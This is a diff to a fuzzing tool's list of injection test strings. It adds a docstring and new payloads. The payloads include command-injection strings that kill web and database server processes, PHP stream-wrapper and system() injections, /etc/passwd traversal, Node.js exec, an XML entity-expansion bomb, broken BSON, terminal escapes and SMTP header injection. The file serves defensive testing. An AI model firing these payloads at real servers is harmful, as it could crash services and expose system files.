@@ -1,6 +1,14 @@
 # -*- coding: utf-8 -*-
 """List of static anomalies that can be injected. Before using,
 replace mittn.org domain references with something you have control over.
+
+These injections should be designed to cause a detectable problem at
+the server end. The tool doesn't check for reflected data, so any
+XSS-style injections are mostly useless here. If you add new ones, try
+to cause (any 5xx series) server error or a timeout. Alternatively,
+try to inject some greppable string (POSSIBLE_INJECTION_PROBLEM used
+here) that can potentially be caught by automated instrumentation at
+target.
 """
 
 anomaly_list = [
@@ -33,13 +41,18 @@ anomaly_list = [
     r"`echo >injected.exe`",  # Backtick exec
     r"| echo >injected.exe",  # Pipe exec
     "../" * 15 + "etc/passwd",  # /etc/passwd
-    "`killall -g apache php nginx python perl node`",  # Backtick exec
-    "| killall -g apache php nginx python perl node",  # Pipe exec
+    "`killall -g apache php nginx python perl node postgres`",  # Backtick exec
+    "| killall -g apache php nginx python perl node postgres",  # Pipe exec
     "`ping localhost`",  # Backtick exec intended to cause a timeout
-    "' . `killall -g apache php nginx python perl node` . '",  # Backtick exec, single quote PHP insert
-    '" . `killall -g apache php nginx python perl node` . "',  # Backtick exec, double quote PHP insert
-    '" . system(\'killall -g apache php nginx python perl node\'); . "',  # E.g. PHP system exec, double quote insert
-    "' . system(\'killall -g apache php nginx python perl node\'); . '",  # E.g. PHP system exec, single quote insert
+    "' . `killall -g apache php nginx python perl node postgres` . '",  # Backtick exec, single quote PHP insert
+    '" . `killall -g apache php nginx python perl node postgres` . "',  # Backtick exec, double quote PHP insert
+    "expect://killall%20-g%20apache%20php",  # A naïve try to leverage PHP's expect:// wrapper
+    "ssh2.exec://localhost/killall%20-g%20apache%20php",  # A naïve try to leverage PHP's ssh2 wrapper
+    "php://filter/resource=/dev/zero",  # A naïve try to leverage PHP's filter wrapper
+    "compress.zlib:///dev/zero",  # A naïve try to leverage PHP's compression wrapper
+    "glob://*",  # A naïve try to leverage PHP's glob wrapper
+    '" . system(\'killall -g apache php nginx python perl node postgres\'); . "',  # E.g. PHP system exec, double quote insert
+    "' . system(\'killall -g apache php nginx python perl node postgres\'); . '",  # E.g. PHP system exec, single quote insert
     "var sys = require('sys'); sys.print('POSSIBLE_INJECTION_PROBLEM');",  # Node.js command injection
     "var exec = require('child_process').exec; exec('ping 127.0.0.1');",  # Node.js command injection, aim at timeout
     "'; var exec = require('child_process').exec; exec('ping 127.0.0.1');",  # Node.js command injection, aim at timeout
@@ -122,7 +135,11 @@ anomaly_list = [
     "\xff\xfe",  # Illegal unicode as string
     "\xff\xff",  # Illegal unicode as string
     '\t',  # tab
-    '<?xml version="1.0"?><!DOCTYPE exp [ <!ENTITY exp "exp"><!ENTITY expa "' + '&exp;' * 100 + '"><!ENTITY expan "' + '&expa;' * 100 + '"><!ENTITY expand "' + '&expan;' * 100 + '"> ]><exp>&expand;</exp>',  # XML entity expansion
+    '<?xml version="1.0"?><!DOCTYPE exp [ <!ENTITY exp "exp"><!ENTITY expa "' + '&exp;' * 100 + '"><!ENTITY expan "' + '&expa;' * 100 + '"><!ENTITY expand "' + '&expan;' * 100 + '"> ]><exp>&expand;</exp>',  # XML entity expansion,
+    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x02\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00\x00',  # Broken BSON (invalid Boolean value)
+    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x01\x04array\x00\x06\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00\x00',  # Broken BSON 2 (embedded document length overflow)
+    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x01\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x03\x00\x00\x00\x00\x00\x00',  # Broken BSON 3 (string length overflow)
+    'c\x00\x00\x00\x0Djavascript_code\x00\x09\x00\x00\x00alert(1)\x00\x01float\x00\x00\x00\x00\x00\x00\x00E@\x08Boolean\x00\x01\x04array\x00\x05\x00\x00\x00\x00\nNull\x00\x02unicodestring\x00\x02\x00\x00\x00\x00\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41',  # Broken BSON 4 (end zero missing and provide something for the parser to chew on)
 
     # Format strings
     r'%s',
@@ -132,7 +149,7 @@ anomaly_list = [
     # get flagged by the tool, but if the test setup's log files are
     # viewed, these might highlight unwanted log injections
     "\x1b[0;1;40;32mM\x1b[0m   \x1b[1;32mM\x1b[0m \x1b[1;31mIII\x1b[32m TTT\x1b[0m \x1b[31mTTT\x1b[37m \x1b[1;34mN\x1b[0m  \x1b[1;34mN\r\n\x1b[32mMM\x1b[0m \x1b[1;32mMM\x1b[0m  \x1b[1;31mI\x1b[0m   \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mNN\x1b[0m \x1b[1;34mN\r\n\x1b[32mM\x1b[0m \x1b[1;32mM\x1b[0m \x1b[1;32mM\x1b[0m  \x1b[1;31mI\x1b[0m   \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mN\x1b[0m \x1b[1;34mNN\r\n\x1b[32mM\x1b[0m   \x1b[1;32mM\x1b[0m  \x1b[1;31mI\x1b[0m   \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mN\x1b[0m \x1b[1;34mNN\r\n\x1b[32mM\x1b[0m   \x1b[1;32mM\x1b[0m \x1b[1;31mIII\x1b[0m  \x1b[1;32mT\x1b[0m   \x1b[31mT\x1b[37m  \x1b[1;34mN\x1b[0m  \x1b[1;34mN\r\n\x1a",
-    "\x1b[2J",  # Clear screen
+    "\x1b[2JPOSSIBLE_INJECTION_PROBLEM",  # Clear screen and show a message
     '\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07',  # BELs
 
     # Email
@@ -140,8 +157,8 @@ anomaly_list = [
     'root@localhost',  # Well-formed but localhost
     '@mittn.org',  # No user
     '@',  # No user or domain
-    'nobody@mittn.org\nCc:nobody@mittn.org',  # Header injection
-    'nobody@mittn.org\r\nCc:nobody@mittn.org',  # Header injection
+    'nobody@mittn.org\nCc:nobodyneither@mittn.org',  # Header injection
+    'nobody@mittn.org\r\nCc:nobodyneither@mittn.org',  # Header injection
     '\r\n.\r\n\r\nMAIL FROM:<root>\r\nRCPT TO:<nobody@mittn.org>\r\nDATA\r\nPOSSIBLE_INJECTION_PROBLEM\r\n.\r\n',  # SMTP injection
 
     # Long strings
